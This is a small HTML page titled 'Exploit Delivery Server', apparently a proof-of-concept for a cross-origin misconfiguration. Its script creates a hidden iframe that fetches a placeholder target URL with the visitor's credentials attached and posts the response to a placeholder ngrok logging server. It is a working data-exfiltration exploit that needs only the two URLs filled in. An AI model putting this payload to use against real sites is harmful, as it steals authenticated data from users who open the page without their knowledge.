<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Exploit Delivery Server</title>
</head>
<body>
<h1>Exploit Delivery Server</h1>

<script>
// Target page to test
const targetUrl = "YOUR_TARGET_URL";

// Send response to your ngrok logging server
const logServer = "NGROK_URL/log";

// Create iframe to fetch data from target
const iframe = document.createElement('iframe');
iframe.style.display = 'none';

iframe.srcdoc = '<script>' +
'var req = new XMLHttpRequest();' +
'req.onload = function() {' +
'  fetch("' + logServer + '", {' +
'    method: "POST",' +
'    headers: {"Content-Type":"application/json"},' +
'    body: JSON.stringify({key: this.responseText})' +
'  });' +
'};' +
'req.open("GET", "' + targetUrl + '", true);' +
'req.withCredentials = true;' +
'req.send();' +
'<\/script>';

document.body.appendChild(iframe);
</script>

</body>
</html>
